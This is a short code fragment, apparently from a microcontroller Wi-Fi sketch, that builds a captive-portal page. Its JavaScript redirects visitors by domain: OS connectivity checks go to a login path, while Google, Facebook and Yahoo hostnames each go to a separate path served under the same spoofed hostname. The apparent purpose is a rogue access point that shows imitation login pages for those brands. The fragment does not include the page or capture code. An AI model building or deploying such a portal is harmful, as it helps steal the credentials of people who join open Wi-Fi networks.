//The javascript captive portal that makes it all happen!
String responseHTML = ""
"<!DOCTYPE html>"
"<html>"
"<body>"
"<script>"
"if (document.domain==\""+PORTALLOGIN+"\"||document.domain==\"go.microsoft.com\"||document.domain==\"clients3.google.com\"||document.domain==\"captive.apple.com/\")"
"{"
"window.open(\"http://"+WELCOMEDOMAIN+PORTALLOGIN_redirect+"\",\"_self\");"
"}"
"else if (document.domain==\""+GOOGLE+"\"||document.domain==\"www."+GOOGLE+"\"||document.domain==\"mobile."+GOOGLE+"\")"
"{"
"window.open(\"http://\"+document.domain+\""+SITE1_redirect+"\",\"_self\");"
"}"
"else if (document.domain==\""+FACEBOOK+"\"||document.domain==\"www."+FACEBOOK+"\"||document.domain==\"mobile."+FACEBOOK+"\")"
"{"
"window.open(\"http://\"+document.domain+\""+SITE2_redirect+"\",\"_self\");"
"}"
"else if (document.domain==\""+YAHOO+"\"||document.domain==\"www."+YAHOO+"\"||document.domain==\"mobile."+YAHOO+"\")"
"{"
"window.open(\"http://\"+document.domain+\""+SITE3_redirect+"\",\"_self\");"
"}"
"else"
"{"
"window.open(\"http://\"+document.domain+\""+SITEOTHER_redirect+"\",\"_self\");"
"}"
"</script>"
"<h1>Redirecting...</h1>"
"</body>"
"</html>";
